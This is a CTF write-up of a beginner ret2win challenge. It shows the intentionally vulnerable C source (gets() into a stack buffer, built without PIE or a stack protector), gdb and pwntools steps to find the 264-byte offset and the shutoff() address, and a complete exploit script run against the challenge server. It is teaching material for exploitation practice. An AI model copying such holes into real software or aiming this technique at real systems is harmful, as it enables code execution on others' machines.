# Overflow In The Fl4gtory

## Description

Overflow in the fl4gtory | 119 points 

A pipe in the fl4gtory broke and now everything is overflowing! Can you get to the  `shutoff()`  valve and shut the pipe off?

This is the first challenge in the pwn intro series

`ncat --ssl overflow-in-the-fl4gtory-0.chals.kitctf.de 1337`

Downloads: [overflow-in-the-fl4gtory.tar.gz](https://ctf.kitctf.de/files/14d1c8973cbd650ae5467cf3a51e9545/overflow-in-the-fl4gtory.tar.gz?token=eyJ1c2VyX2lkIjo4MzksInRlYW1faWQiOjUwNCwiZmlsZV9pZCI6NjZ9.ZINB8A.45_D_bUK_Wpzq2rdSlqzeQaYELM)

## Analysis

Challenge gives us simplest ret2win challenge.

```c
#include <stdio.h>
#include <stdlib.h>

// gcc -no-pie -fno-stack-protector -o overflow-in-the-fl4gtory overflow-in-the-fl4gtory.c

void shutoff() {
	printf("Pipe shut off!\n");
	printf("Congrats! You've solved (or exploited) the overflow! Get your flag:\n");
	execve("/bin/sh", NULL, NULL);
}


int main() {
	char buf[0xff]; // 0xFF == 255
	gets(buf);
	puts(buf);
	return 0;
}
```

`-no-pie` means that addresses will be the same when program is run, meaning remote application has same address.<br>
`-fno-stack-protector` basically allows buffer overflows to happen.

To overflow the buffer we need more then 255 characters, if RIP (x64 Instruction Pointer) is overwritten with address of our choice (shutdown) we can "win"

Let's find padding.
```sh
└─$ cyclic 300 | clip 

└─$ gdb -q ./overflow-in-the-fl4gtory
pwndbg> run
{PASTE_CYCLIC_PATTERN}
... Program Crashes ...

*RBP  0x636161706361616f ('oaacpaac')
*RSP  0x7ffd7a4547d8 ◂— 'qaacraacsaactaacuaacvaacwaacxaacyaac'
*RIP  0x4011b8 (main+52) ◂— ret 

pwndbg> quit

└─$ cyclic -l qaac
264 # Padding
```
<small>Note: `clip` directs output to clipboard `alias clip="xclip -sel clip"`</small>

Now we need return address of `shutoff`
```py
>>> from pwn import *
>>> elf = ELF("./overflow-in-the-fl4gtory", checksec=False)
>>> elf.functions.shutoff
Function(name='shutoff', address=0x401146, size=0x3e, elf=ELF('./overflow-in-the-fl4gtory')) 
```

This can also be found with gdb `gdb ./program -> info functions` or [**radare2**](https://github.com/radareorg/radare2) `r2 ./program -> aaa -> afl`

## Solution

```py
from pwn import *

# context.log_level = "DEBUG"

exe = "./overflow-in-the-fl4gtory"
elf = context.binary = ELF(exe, checksec=False)

if args.REMOTE:
    proc = remote('overflow-in-the-fl4gtory-0.chals.kitctf.de', 1337, ssl=True)
else: 
    proc = process(exe)

padding = 264
payload = flat(
    b"\x90" * padding,
    elf.functions.shutoff
)

proc.sendline(payload)

proc.sendlineafter(b"Get your flag:\n", b"cat flag.txt; echo;")
flag = proc.recvline().decode().strip()
print(flag)

# or comment lines above and use the shell and use cat
# proc.interactive()
```

```sh
└─$ py exploit.py REMOTE
[+] Opening connection to overflow-in-the-fl4gtory-0.chals.kitctf.de on port 1337: Done
GPNCTF{M0re_0verf0ws_ar3_c0ming_:O}
[*] Closed connection to overflow-in-the-fl4gtory-0.chals.kitctf.de port 1337
```